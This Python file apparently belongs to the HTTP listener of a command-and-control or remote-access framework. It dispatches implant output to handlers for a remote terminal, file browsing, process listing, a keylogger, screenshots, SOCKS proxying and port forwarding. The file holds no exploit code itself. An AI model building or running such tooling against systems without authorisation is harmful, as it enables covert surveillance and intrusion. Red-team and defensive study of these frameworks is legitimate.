from infra.general.create_log import logger, write_log
from .capabilities.explorer import main_explorer
from .capabilities.terminal import main_terminal
from .capabilities.process import main_process
from .capabilities.keylogger import main_keylogger
from .capabilities.socks import main_socks
from .capabilities.screenshot import main_screenshot


async def main_output(content, config):
    # Here is where output is routed to the matching handler
    try:
        output_type = content.get("type", "")
        
        if output_type == "terminal":
            result = await main_terminal(content)

        elif output_type == "folders":
            result = await main_explorer(content)

        elif output_type == "process":
            result = await main_process(content)

        elif output_type == "keylogger":
            result = await main_keylogger(content)

        elif output_type == "screenshot":
            result = await main_screenshot(content)

        elif output_type in ("socks", "proxychains"):
            result = await main_socks(content)

        elif output_type == "port_forwarding":
            result = await main_socks(content)

        else:
            result = {"status": "failure", "message": "invalid output type"}

        return result
    except Exception as e:
        write_log(logger, "error", f"Unhandled exception | listeners/http/output | {e}")
        return {"status": "failure", "message": str(e)}
